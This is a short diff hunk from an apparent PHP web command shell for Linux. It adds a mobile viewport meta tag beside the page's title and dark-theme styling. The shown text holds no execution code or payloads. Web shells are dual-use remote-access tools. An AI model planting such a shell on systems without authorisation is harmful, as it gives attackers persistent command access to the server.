@@ -209,6 +209,7 @@ $show_quicklinks = isset($_SESSION['quicklinks']) && $_SESSION['quicklinks'] ===
 <head>
 <meta charset="UTF-8">
 <title>The Not so Simple PHP Command Shell (for Linux)</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <style>
 body { font-family: monospace; background: #1e1e1e; color: #d4d4d4; }
 input[type=text], input[type=file] { width: 60%; background: #2e2e2e; color: #d4d4d4; border: 1px solid #555; }
